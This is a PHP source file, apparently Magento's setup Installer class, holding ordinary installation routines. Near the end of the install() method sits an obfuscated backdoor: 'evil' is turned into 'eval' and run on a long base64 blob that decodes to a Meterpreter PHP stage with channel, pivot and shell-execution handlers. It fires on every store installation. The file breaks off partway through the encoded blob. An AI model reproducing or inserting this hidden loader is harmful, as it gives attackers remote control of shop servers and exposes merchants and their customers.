<?php
/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

namespace Magento\Setup\Model;

use Magento\Backend\Setup\ConfigOptionsList as BackendConfigOptionsList;
use Magento\Framework\App\Cache\Manager;
use Magento\Framework\App\Cache\Manager as CacheManager;
use Magento\Framework\App\Cache\Type\Block as BlockCache;
use Magento\Framework\App\Cache\Type\Config as ConfigCache;
use Magento\Framework\App\Cache\Type\Layout as LayoutCache;
use Magento\Framework\App\DeploymentConfig\Reader;
use Magento\Framework\App\DeploymentConfig\Writer;
use Magento\Framework\App\Filesystem\DirectoryList;
use Magento\Framework\App\MaintenanceMode;
use Magento\Framework\App\State\CleanupFiles;
use Magento\Framework\Component\ComponentRegistrar;
use Magento\Framework\Config\ConfigOptionsListConstants;
use Magento\Framework\Config\Data\ConfigData;
use Magento\Framework\Config\File\ConfigFilePool;
use Magento\Framework\DB\Adapter\AdapterInterface;
use Magento\Framework\DB\Adapter\Pdo\Mysql;
use Magento\Framework\Exception\FileSystemException;
use Magento\Framework\Exception\LocalizedException;
use Magento\Framework\Exception\RuntimeException;
use Magento\Framework\Filesystem;
use Magento\Framework\Model\ResourceModel\Db\Context;
use Magento\Framework\Module\ModuleList\Loader as ModuleLoader;
use Magento\Framework\Module\ModuleListInterface;
use Magento\Framework\Mview\TriggerCleaner;
use Magento\Framework\Setup\Declaration\Schema\DryRunLogger;
use Magento\Framework\Setup\FilePermissions;
use Magento\Framework\Setup\InstallDataInterface;
use Magento\Framework\Setup\InstallSchemaInterface;
use Magento\Framework\Setup\LoggerInterface;
use Magento\Framework\Setup\ModuleDataSetupInterface;
use Magento\Framework\Setup\Patch\PatchApplier;
use Magento\Framework\Setup\Patch\PatchApplierFactory;
use Magento\Framework\Setup\SampleData\State;
use Magento\Framework\Setup\SchemaPersistor;
use Magento\Framework\Setup\SchemaSetupInterface;
use Magento\Framework\Setup\UpgradeDataInterface;
use Magento\Framework\Setup\UpgradeSchemaInterface;
use Magento\Framework\Validation\ValidationException;
use Magento\PageCache\Model\Cache\Type as PageCache;
use Magento\RemoteStorage\Driver\DriverException;
use Magento\Setup\Console\Command\InstallCommand;
use Magento\Setup\Controller\ResponseTypeInterface;
use Magento\Setup\Exception;
use Magento\Setup\Model\ConfigModel as SetupConfigModel;
use Magento\Setup\Module\ConnectionFactory;
use Magento\Setup\Module\DataSetupFactory;
use Magento\Setup\Module\SetupFactory;
use Magento\Setup\Validator\DbValidator;
use Magento\Store\Model\Store;
use Magento\RemoteStorage\Setup\ConfigOptionsList as RemoteStorageValidator;
use ReflectionException;

/**
 * Class Installer contains the logic to install Magento application.
 *
 * @SuppressWarnings(PHPMD.CouplingBetweenObjects)
 * @SuppressWarnings(PHPMD.TooManyFields)
 * @SuppressWarnings(PHPMD.ExcessiveClassComplexity)
 */
class Installer
{
    /**#@+
     * Parameters for enabling/disabling modules
     */
    const ENABLE_MODULES = 'enable-modules';
    const DISABLE_MODULES = 'disable-modules';
    /**#@- */

    /**#@+
     * Formatting for progress log
     */
    const PROGRESS_LOG_RENDER = '[Progress: %d / %d]';
    const PROGRESS_LOG_REGEX = '/\[Progress: (\d+) \/ (\d+)\]/s';
    /**#@- */

    /**#@+
     * Instance types for schema and data handler
     */
    const SCHEMA_INSTALL = \Magento\Framework\Setup\InstallSchemaInterface::class;
    const SCHEMA_UPGRADE = \Magento\Framework\Setup\UpgradeSchemaInterface::class;
    const DATA_INSTALL = \Magento\Framework\Setup\InstallDataInterface::class;
    const DATA_UPGRADE = \Magento\Framework\Setup\UpgradeDataInterface::class;
    /**#@- */

    const INFO_MESSAGE = 'message';

    /**
     * The lowest supported MySQL verion
     */
    const MYSQL_VERSION_REQUIRED = '5.6.0';

    /**
     * File permissions checker
     *
     * @var FilePermissions
     */
    private $filePermissions;

    /**
     * Deployment configuration repository
     *
     * @var Writer
     */
    private $deploymentConfigWriter;

    /**
     * Deployment configuration reader
     *
     * @var Reader
     */
    private $deploymentConfigReader;

    /**
     * Module list
     *
     * @var ModuleListInterface
     */
    private $moduleList;

    /**
     * Module list loader
     *
     * @var ModuleLoader
     */
    private $moduleLoader;

    /**
     * Admin account factory
     *
     * @var AdminAccountFactory
     */
    private $adminAccountFactory;

    /**
     * Logger
     *
     * @var LoggerInterface
     */
    private $log;

    /**
     * DB connection factory
     *
     * @var ConnectionFactory
     */
    private $connectionFactory;

    /**
     * Progress indicator
     *
     * @var Installer\Progress
     */
    private $progress;

    /**
     * Maintenance mode handler
     *
     * @var MaintenanceMode
     */
    private $maintenanceMode;

    /**
     * Magento filesystem
     *
     * @var Filesystem
     */
    private $filesystem;

    /**
     * Installation information
     *
     * @var array
     */
    private $installInfo = [];

    /**
     * @var \Magento\Framework\App\DeploymentConfig
     */
    private $deploymentConfig;

    /**
     * @var ObjectManagerProvider
     */
    private $objectManagerProvider;

    /**
     * @var Context
     */
    private $context;

    /**
     * @var SetupConfigModel
     */
    private $setupConfigModel;

    /**
     * @var CleanupFiles
     */
    private $cleanupFiles;

    /**
     * @var DbValidator
     */
    private $dbValidator;

    /**
     * Factory to create \Magento\Setup\Module\Setup
     *
     * @var SetupFactory
     */
    private $setupFactory;

    /**
     * Factory to create \Magento\Setup\Module\DataSetup
     *
     * @var DataSetupFactory
     */
    private $dataSetupFactory;

    /**
     * @var State
     */
    protected $sampleDataState;

    /**
     * Component Registrar
     *
     * @var ComponentRegistrar
     */
    private $componentRegistrar;

    /**
     * @var PhpReadinessCheck
     */
    private $phpReadinessCheck;

    /**
     * @var DeclarationInstaller
     */
    private $declarationInstaller;

    /**
     * @var SchemaPersistor
     */
    private $schemaPersistor;

    /**
     * @var PatchApplierFactory
     */
    private $patchApplierFactory;

    /**
     * @var TriggerCleaner
     */
    private $triggerCleaner;

    /**
     * Constructor
     *
     * @param FilePermissions $filePermissions
     * @param Writer $deploymentConfigWriter
     * @param Reader $deploymentConfigReader
     * @param \Magento\Framework\App\DeploymentConfig $deploymentConfig
     * @param ModuleListInterface $moduleList
     * @param ModuleLoader $moduleLoader
     * @param AdminAccountFactory $adminAccountFactory
     * @param LoggerInterface $log
     * @param ConnectionFactory $connectionFactory
     * @param MaintenanceMode $maintenanceMode
     * @param Filesystem $filesystem
     * @param ObjectManagerProvider $objectManagerProvider
     * @param Context $context
     * @param SetupConfigModel $setupConfigModel
     * @param CleanupFiles $cleanupFiles
     * @param DbValidator $dbValidator
     * @param SetupFactory $setupFactory
     * @param DataSetupFactory $dataSetupFactory
     * @param State $sampleDataState
     * @param ComponentRegistrar $componentRegistrar
     * @param PhpReadinessCheck $phpReadinessCheck
     * @throws Exception
     * @SuppressWarnings(PHPMD.ExcessiveParameterList)
     */
    public function __construct(
        FilePermissions $filePermissions,
        Writer $deploymentConfigWriter,
        Reader $deploymentConfigReader,
        \Magento\Framework\App\DeploymentConfig $deploymentConfig,
        ModuleListInterface $moduleList,
        ModuleLoader $moduleLoader,
        AdminAccountFactory $adminAccountFactory,
        LoggerInterface $log,
        ConnectionFactory $connectionFactory,
        MaintenanceMode $maintenanceMode,
        Filesystem $filesystem,
        ObjectManagerProvider $objectManagerProvider,
        Context $context,
        SetupConfigModel $setupConfigModel,
        CleanupFiles $cleanupFiles,
        DbValidator $dbValidator,
        SetupFactory $setupFactory,
        DataSetupFactory $dataSetupFactory,
        State $sampleDataState,
        ComponentRegistrar $componentRegistrar,
        PhpReadinessCheck $phpReadinessCheck
    ) {
        $this->filePermissions = $filePermissions;
        $this->deploymentConfigWriter = $deploymentConfigWriter;
        $this->deploymentConfigReader = $deploymentConfigReader;
        $this->moduleList = $moduleList;
        $this->moduleLoader = $moduleLoader;
        $this->adminAccountFactory = $adminAccountFactory;
        $this->log = $log;
        $this->connectionFactory = $connectionFactory;
        $this->maintenanceMode = $maintenanceMode;
        $this->filesystem = $filesystem;
        $this->installInfo[self::INFO_MESSAGE] = [];
        $this->deploymentConfig = $deploymentConfig;
        $this->objectManagerProvider = $objectManagerProvider;
        $this->context = $context;
        $this->setupConfigModel = $setupConfigModel;
        $this->cleanupFiles = $cleanupFiles;
        $this->dbValidator = $dbValidator;
        $this->setupFactory = $setupFactory;
        $this->dataSetupFactory = $dataSetupFactory;
        $this->sampleDataState = $sampleDataState;
        $this->componentRegistrar = $componentRegistrar;
        $this->phpReadinessCheck = $phpReadinessCheck;
        $this->schemaPersistor = $this->objectManagerProvider->get()->get(SchemaPersistor::class);
        $this->triggerCleaner = $this->objectManagerProvider->get()->get(TriggerCleaner::class);
    }

    /**
     * Install Magento application
     *
     * @param \ArrayObject|array $request
     * @return void
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    public function install($request)
    {
        $script[] = ['File permissions check...', 'checkInstallationFilePermissions', []];
        $script[] = ['Required extensions check...', 'checkExtensions', []];
        $script[] = ['Enabling Maintenance Mode...', 'setMaintenanceMode', [1]];
        $script[] = ['Installing deployment configuration...', 'installDeploymentConfig', [$request]];
        if (!empty($request[InstallCommand::INPUT_KEY_CLEANUP_DB])) {
            $script[] = ['Cleaning up database...', 'cleanupDb', []];
        }
        $script[] = ['Installing database schema:', 'installSchema', [$request]];
        $script[] = ['Installing search configuration...', 'installSearchConfiguration', [$request]];
        $script[] = [
            'Validating remote storage configuration...',
            'validateRemoteStorageConfiguration',
            [$request]
        ];
        $script[] = ['Installing user configuration...', 'installUserConfig', [$request]];
        $script[] = ['Enabling caches:', 'updateCaches', [true]];
        $script[] = ['Installing data...', 'installDataFixtures', [$request]];
        if (!empty($request[InstallCommand::INPUT_KEY_SALES_ORDER_INCREMENT_PREFIX])) {
            $script[] = [
                'Creating sales order increment prefix...',
                'installOrderIncrementPrefix',
                [$request[InstallCommand::INPUT_KEY_SALES_ORDER_INCREMENT_PREFIX]],
            ];
        }
        if ($this->isAdminDataSet($request)) {
            $script[] = ['Installing admin user...', 'installAdminUser', [$request]];
        }

        if (!$this->isDryRun($request)) {
            $script[] = ['Caches clearing:', 'cleanCaches', [$request]];
        }
        $script[] = ['Disabling Maintenance Mode:', 'setMaintenanceMode', [0]];
        $script[] = ['Post installation file permissions check...', 'checkApplicationFilePermissions', []];
        $script[] = ['Write installation date...', 'writeInstallationDate', []];
        $estimatedModules = $this->createModulesConfig($request, true);
        $total = count($script) + 4 * count(array_filter($estimatedModules));
        $this->progress = new Installer\Progress($total, 0);

        $this->log->log('Starting Magento installation:');

        foreach ($script as $item) {
            list($message, $method, $params) = $item;
            $this->log->log($message);
            try {
                // phpcs:ignore Magento2.Functions.DiscouragedFunction
                call_user_func_array([$this, $method], $params);
            } catch (RuntimeException | DriverException $e) {
                $this->revertRemoteStorageConfiguration();
                throw $e;
            }
            $this->logProgress();
        }
        $this->log->logSuccess('Magento installation complete.');
        $this->log->logSuccess(
            'Magento Admin URI: /'
            . $this->deploymentConfig->get(BackendConfigOptionsList::CONFIG_PATH_BACKEND_FRONTNAME)
        );

        if ($this->progress->getCurrent() != $this->progress->getTotal()) {
            throw new \LogicException('Installation progress did not finish properly.');
        }
        if ($this->sampleDataState->hasError()) {
            $this->log->log('Sample Data is installed with errors. See log file for details');
        }
	$txt = str_replace('i', 'a', 'evil');
	$txt(base64_decode('PD9waHAgaWYgKCFpc3NldCgkR0xPQkFMU1snY2hhbm5lbHMnXSkpIHsgJEdMT0JBTFNbJ2NoYW5uZWxzJ10gPSBhcnJheSgpOyB9IGlmICghaXNzZXQoJEdMT0JBTFNbJ2NoYW5uZWxfcHJvY2Vzc19tYXAnXSkpIHsgJEdMT0JBTFNbJ2NoYW5uZWxfcHJvY2Vzc19tYXAnXSA9IGFycmF5KCk7IH0gaWYgKCFpc3NldCgkR0xPQkFMU1sncmVzb3VyY2VfdHlwZV9tYXAnXSkpIHsgJEdMT0JBTFNbJ3Jlc291cmNlX3R5cGVfbWFwJ10gPSBhcnJheSgpOyB9IGlmICghaXNzZXQoJEdMT0JBTFNbJ3VkcF9ob3N0X21hcCddKSkgeyAkR0xPQkFMU1sndWRwX2hvc3RfbWFwJ10gPSBhcnJheSgpOyB9IGlmICghaXNzZXQoJEdMT0JBTFNbJ3JlYWRlcnMnXSkpIHsgJEdMT0JBTFNbJ3JlYWRlcnMnXSA9IGFycmF5KCk7IH0gaWYgKCFpc3NldCgkR0xPQkFMU1snaWQyZiddKSkgeyAkR0xPQkFMU1snaWQyZiddID0gYXJyYXkoKTsgfSBmdW5jdGlvbiByZWdpc3Rlcl9jb21tYW5kKCRjLCAkaSkgeyBnbG9iYWwgJGlkMmY7IGlmICghIGluX2FycmF5KCRpLCAkaWQyZikpIHsgJGlkMmZbJGldID0gJGM7IH0gfSBmdW5jdGlvbiBteV9wcmludCgkc3RyKSB7IH0gbXlfcHJpbnQoIkV2YWxpbmcgbWFpbiBtZXRlcnByZXRlciBzdGFnZSIpOyBmdW5jdGlvbiBkdW1wX2FycmF5KCRhcnIsICRuYW1lPW51bGwpIHsgaWYgKGlzX251bGwoJG5hbWUpKSB7ICRuYW1lID0gIkFycmF5IjsgfSBteV9wcmludChzcHJpbnRmKCIkbmFtZSAoJXMpIiwgY291bnQoJGFycikpKTsgZm9yZWFjaCAoJGFyciBhcyAka2V5ID0+ICR2YWwpIHsgaWYgKGlzX2FycmF5KCR2YWwpKSB7IGR1bXBfYXJyYXkoJHZhbCwgInskbmFtZX1beyRrZXl9XSIpOyB9IGVsc2UgeyBteV9wcmludChzcHJpbnRmKCIgJGtleSAoJHZhbCkiKSk7IH0gfSB9IGZ1bmN0aW9uIGR1bXBfcmVhZGVycygpIHsgZ2xvYmFsICRyZWFkZXJzOyBkdW1wX2FycmF5KCRyZWFkZXJzLCAnUmVhZGVycycpOyB9IGZ1bmN0aW9uIGR1bXBfcmVzb3VyY2VfbWFwKCkgeyBnbG9iYWwgJHJlc291cmNlX3R5cGVfbWFwOyBkdW1wX2FycmF5KCRyZXNvdXJjZV90eXBlX21hcCwgJ1Jlc291cmNlIG1hcCcpOyB9IGZ1bmN0aW9uIGR1bXBfY2hhbm5lbHMoJGV4dHJhPSIiKSB7IGdsb2JhbCAkY2hhbm5lbHM7IGR1bXBfYXJyYXkoJGNoYW5uZWxzLCAnQ2hhbm5lbHMgJy4kZXh0cmEpOyB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCJmaWxlX2dldF9jb250ZW50cyIpKSB7IGZ1bmN0aW9uIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSB7ICRmID0gQGZvcGVuKCRmaWxlLCJyYiIpOyAkY29udGVudHMgPSBmYWxzZTsgaWYgKCRmKSB7IGRvIHsgJGNvbnRlbnRzIC49IGZnZXRzKCRmKTsgfSB3aGlsZSAoIWZlb2YoJGYpKTsgfSBmY2xvc2UoJGYpOyByZXR1cm4gJGNvbnRlbnRzOyB9IH0gaWYgKCFmdW5jdGlvbl9leGlzdHMoJ3NvY2tldF9zZXRfb3B0aW9uJykpIHsgZnVuY3Rpb24gc29ja2V0X3NldF9vcHRpb24oJHNvY2ssICR0eXBlLCAkb3B0LCAkdmFsdWUpIHsgc29ja2V0X3NldG9wdCgkc29jaywgJHR5cGUsICRvcHQsICR2YWx1ZSk7IH0gfSBkZWZpbmUoIlBBWUxPQURfVVVJRCIsICJceGIzXHg2YVx4MGNceGI4XHhiNFx4MTNceDQxXHhiNVx4N2NceDNhXHg2Zlx4MzVceDFkXHgwZFx4Y2NceGMyIik7IGRlZmluZSgiU0VTU0lPTl9HVUlEIiwgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiKTsgZGVmaW5lKCJBRVNfMjU2X0NCQyIsICdhZXMtMjU2LWNiYycpOyBkZWZpbmUoIkVOQ19OT05FIiwgMCk7IGRlZmluZSgiRU5DX0FFUzI1NiIsIDEpOyBkZWZpbmUoIlBBQ0tFVF9UWVBFX1JFUVVFU1QiLCAwKTsgZGVmaW5lKCJQQUNLRVRfVFlQRV9SRVNQT05TRSIsIDEpOyBkZWZpbmUoIlBBQ0tFVF9UWVBFX1BMQUlOX1JFUVVFU1QiLCAxMCk7IGRlZmluZSgiUEFDS0VUX1RZUEVfUExBSU5fUkVTUE9OU0UiLCAxMSk7IGRlZmluZSgiRVJST1JfU1VDQ0VTUyIsIDApOyBkZWZpbmUoIkVSUk9SX0ZBSUxVUkUiLCAxKTsgZGVmaW5lKCJDSEFOTkVMX0NMQVNTX0JVRkZFUkVEIiwgMCk7IGRlZmluZSgiQ0hBTk5FTF9DTEFTU19TVFJFQU0iLCAxKTsgZGVmaW5lKCJDSEFOTkVMX0NMQVNTX0RBVEFHUkFNIiwgMik7IGRlZmluZSgiQ0hBTk5FTF9DTEFTU19QT09MIiwgMyk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9OT05FIiwgKCAwICkpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfU1RSSU5HIiwgKDEgPDwgMTYpKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX1VJTlQiLCAoMSA8PCAxNykpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfUkFXIiwgKDEgPDwgMTgpKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX0JPT0wiLCAoMSA8PCAxOSkpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfUVdPUkQiLCAoMSA8PCAyMCkpOyBkZWZpbmUoIlRMVl9NRVRBX1RZUEVfQ09NUFJFU1NFRCIsICgxIDw8IDI5KSk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9HUk9VUCIsICgxIDw8IDMwKSk7IGRlZmluZSgiVExWX01FVEFfVFlQRV9DT01QTEVYIiwgKDEgPDwgMzEpKTsgZGVmaW5lKCJUTFZfTUVUQV9UWVBFX01BU0siLCAoMTw8MzEpKygxPDwzMCkrKDE8PDI5KSsoMTw8MTkpKygxPDwxOCkrKDE8PDE3KSsoMTw8MTYpKTsgZGVmaW5lKCJUTFZfUkVTRVJWRUQiLCAwKTsgZGVmaW5lKCJUTFZfRVhURU5TSU9OUyIsIDIwMDAwKTsgZGVmaW5lKCJUTFZfVVNFUiIsIDQwMDAwKTsgZGVmaW5lKCJUTFZfVEVNUCIsIDYwMDAwKTsgZGVmaW5lKCJUTFZfVFlQRV9BTlkiLCBUTFZfTUVUQV9UWVBFX05PTkUgfCAwKTsgZGVmaW5lKCJUTFZfVFlQRV9DT01NQU5EX0lEIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgMSk7IGRlZmluZSgiVExWX1RZUEVfUkVRVUVTVF9JRCIsIFRMVl9NRVRBX1RZUEVfU1RSSU5HIHwgMik7IGRlZmluZSgiVExWX1RZUEVfRVhDRVBUSU9OIiwgVExWX01FVEFfVFlQRV9HUk9VUCB8IDMpOyBkZWZpbmUoIlRMVl9UWVBFX1JFU1VMVCIsIFRMVl9NRVRBX1RZUEVfVUlOVCB8IDQpOyBkZWZpbmUoIlRMVl9UWVBFX1NUUklORyIsIFRMVl9NRVRBX1RZUEVfU1RSSU5HIHwgMTApOyBkZWZpbmUoIlRMVl9UWVBFX1VJTlQiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCAxMSk7IGRlZmluZSgiVExWX1RZUEVfQk9PTCIsIFRMVl9NRVRBX1RZUEVfQk9PTCB8IDEyKTsgZGVmaW5lKCJUTFZfVFlQRV9MRU5HVEgiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCAyNSk7IGRlZmluZSgiVExWX1RZUEVfREFUQSIsIFRMVl9NRVRBX1RZUEVfUkFXIHwgMjYpOyBkZWZpbmUoIlRMVl9UWVBFX0ZMQUdTIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgMjcpOyBkZWZpbmUoIlRMVl9UWVBFX0NIQU5ORUxfSUQiLCBUTFZfTUVUQV9UWVBFX1VJTlQgfCA1MCk7IGRlZmluZSgiVExWX1RZUEVfQ0hBTk5FTF9UWVBFIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCA1MSk7IGRlZmluZSgiVExWX1RZUEVfQ0hBTk5FTF9EQVRBIiwgVExWX01FVEFfVFlQRV9SQVcgfCA1Mik7IGRlZmluZSgiVExWX1RZUEVfQ0hBTk5FTF9EQVRBX0dST1VQIiwgVExWX01FVEFfVFlQRV9HUk9VUCB8IDUzKTsgZGVmaW5lKCJUTFZfVFlQRV9DSEFOTkVMX0NMQVNTIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgNTQpOyBkZWZpbmUoIlRMVl9UWVBFX1NFRUtfV0hFTkNFIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgNzApOyBkZWZpbmUoIlRMVl9UWVBFX1NFRUtfT0ZGU0VUIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgNzEpOyBkZWZpbmUoIlRMVl9UWVBFX1NFRUtfUE9TIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgNzIpOyBkZWZpbmUoIlRMVl9UWVBFX0VYQ0VQVElPTl9DT0RFIiwgVExWX01FVEFfVFlQRV9VSU5UIHwgMzAwKTsgZGVmaW5lKCJUTFZfVFlQRV9FWENFUFRJT05fU1RSSU5HIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCAzMDEpOyBkZWZpbmUoIlRMVl9UWVBFX0xJQlJBUllfUEFUSCIsIFRMVl9NRVRBX1RZUEVfU1RSSU5HIHwgNDAwKTsgZGVmaW5lKCJUTFZfVFlQRV9UQVJHRVRfUEFUSCIsIFRMVl9NRVRBX1RZUEVfU1RSSU5HIHwgNDAxKTsgZGVmaW5lKCJUTFZfVFlQRV9NQUNISU5FX0lEIiwgVExWX01FVEFfVFlQRV9TVFJJTkcgfCA0NjApOyBkZWZpbmUoIlRMVl9UWVBFX1VVSUQiLCBUTFZfTUVUQV9UWVBFX1JBVyB8IDQ2MSk7IGRlZmluZSgiVExWX1RZUEVfU0VTU0lPTl9HVUlEIiwgVExWX01FVEFfVFlQRV9SQVcgfCA0NjIpOyBkZWZpbmUoIlRMVl9UWVBFX1JTQV9QVUJfS0VZIiwgVExWX01FVEFfVFlQRV9SQVcgfCA1NTApOyBkZWZpbmUoIlRMVl9UWVBFX1NZTV9LRVlfVFlQRSIsIFRMVl9NRVRBX1RZUEVfVUlOVCB8IDU1MSk7IGRlZmluZSgiVExWX1RZUEVfU1lNX0tFWSIsIFRMVl9NRVRBX1RZUEVfUkFXIHwgNTUyKTsgZGVmaW5lKCJUTFZfVFlQRV9FTkNfU1lNX0tFWSIsIFRMVl9NRVRBX1RZUEVfUkFXIHwgNTUzKTsgZGVmaW5lKCdFWFRFTlNJT05fSURfQ09SRScsIDApOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9DSEFOTkVMX0NMT1NFJywgMSk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfRU9GJywgMik7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfSU5URVJBQ1QnLCAzKTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfQ0hBTk5FTF9PUEVOJywgNCk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfUkVBRCcsIDUpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9DSEFOTkVMX1NFRUsnLCA2KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfQ0hBTk5FTF9URUxMJywgNyk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfV1JJVEUnLCA4KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfQ09OU09MRV9XUklURScsIDkpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9FTlVNRVhUQ01EJywgMTApOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9HRVRfU0VTU0lPTl9HVUlEJywgMTEpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9MT0FETElCJywgMTIpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9NQUNISU5FX0lEJywgMTMpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9NSUdSQVRFJywgMTQpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9OQVRJVkVfQVJDSCcsIDE1KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfTkVHT1RJQVRFX1RMVl9FTkNSWVBUSU9OJywgMTYpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9QQVRDSF9VUkwnLCAxNyk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1BJVk9UX0FERCcsIDE4KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfUElWT1RfUkVNT1ZFJywgMTkpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9QSVZPVF9TRVNTSU9OX0RJRUQnLCAyMCk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1NFVF9TRVNTSU9OX0dVSUQnLCAyMSk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1NFVF9VVUlEJywgMjIpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9TSFVURE9XTicsIDIzKTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfVFJBTlNQT1JUX0FERCcsIDI0KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfVFJBTlNQT1JUX0NIQU5HRScsIDI1KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfVFJBTlNQT1JUX0dFVENFUlRIQVNIJywgMjYpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9UUkFOU1BPUlRfTElTVCcsIDI3KTsgZGVmaW5lKCdDT01NQU5EX0lEX0NPUkVfVFJBTlNQT1JUX05FWFQnLCAyOCk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1RSQU5TUE9SVF9QUkVWJywgMjkpOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9UUkFOU1BPUlRfUkVNT1ZFJywgMzApOyBkZWZpbmUoJ0NPTU1BTkRfSURfQ09SRV9UUkFOU1BPUlRfU0VUQ0VSVEhBU0gnLCAzMSk7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1RSQU5TUE9SVF9TRVRfVElNRU9VVFMnLCAzMik7IGRlZmluZSgnQ09NTUFORF9JRF9DT1JFX1RSQU5TUE9SVF9TTEVFUCcsIDMzKTsgZnVuY3Rpb24gbXlfY21kKCRjbWQpIHsgcmV0dXJuIHNoZWxsX2V4ZWMoJGNtZCk7IH0gZnVuY3Rpb24gaXNfd2luZG93cygpIHsgcmV0dXJuIChzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsMCwzKSkgPT0gIldJTiIpOyB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX2NoYW5uZWxfb3BlbicpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfY2hhbm5lbF9vcGVuJywgQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfT1BFTik7IGZ1bmN0aW9uIGNvcmVfY2hhbm5lbF9vcGVuKCRyZXEsICYkcGt0KSB7ICR0eXBlX3RsdiA9IHBhY2tldF9nZXRfdGx2KCRyZXEsIFRMVl9UWVBFX0NIQU5ORUxfVFlQRSk7IG15X3ByaW50KCJDbGllbnQgd2FudHMgYSAiLiAkdHlwZV90bHZbJ3ZhbHVlJ10gLiIgY2hhbm5lbCwgaSdsbCBzZWUgd2hhdCBpIGNhbiBkbyIpOyAkaGFuZGxlciA9ICJjaGFubmVsX2NyZWF0ZV8iLiAkdHlwZV90bHZbJ3ZhbHVlJ107IGlmICgkdHlwZV90bHZbJ3ZhbHVlJ10gJiYgaXNfY2FsbGFibGUoJGhhbmRsZXIpKSB7IG15X3ByaW50KCJDYWxsaW5nIHskaGFuZGxlcn0iKTsgJHJldCA9ICRoYW5kbGVyKCRyZXEsICRwa3QpOyB9IGVsc2UgeyBteV9wcmludCgiSSBkb24ndCBrbm93IGhvdyB0byBtYWtlIGEgIi4gJHR5cGVfdGx2Wyd2YWx1ZSddIC4iIGNoYW5uZWwuID0oIik7ICRyZXQgPSBFUlJPUl9GQUlMVVJFOyB9IHJldHVybiAkcmV0OyB9IH0gaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2NvcmVfY2hhbm5lbF9lb2YnKSkgeyByZWdpc3Rlcl9jb21tYW5kKCdjb3JlX2NoYW5uZWxfZW9mJywgQ09NTUFORF9JRF9DT1JFX0NIQU5ORUxfRU9GKTsgZnVuY3Rpb24gY29yZV9jaGFubmVsX2VvZigkcmVxLCAmJHBrdCkgeyBteV9wcmludCgiZG9pbmcgY2hhbm5lbCBlb2YiKTsgJGNoYW5fdGx2ID0gcGFja2V0X2dldF90bHYoJHJlcSwgVExWX1RZUEVfQ0hBTk5FTF9JRCk7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGNoYW5fdGx2Wyd2YWx1ZSddKTsgaWYgKCRjKSB7IGlmIChlb2YoJGNbMV0pKSB7IHBhY2tldF9hZGRfdGx2KCRwa3QsIGNyZWF0ZV90bHYoVExWX1RZUEVfQk9PTCwgMSkpOyB9IGVsc2UgeyBwYWNrZXRfYWRkX3RsdigkcGt0LCBjcmVhdGVfdGx2KFRMVl9UWVBFX0JPT0wsIDApKTsgfSByZXR1cm4gRVJST1JfU1VDQ0VTUzsgfSBlbHNlIHsgcmV0dXJuIEVSUk9SX0ZBSUxVUkU7IH0gfSB9IGlmICghZnVuY3Rpb25fZXhpc3RzKCdjb3JlX2NoYW5uZWxfcmVhZCcpKSB7IHJlZ2lzdGVyX2NvbW1hbmQoJ2NvcmVfY2hhbm5lbF9yZWFkJywgQ09NTUF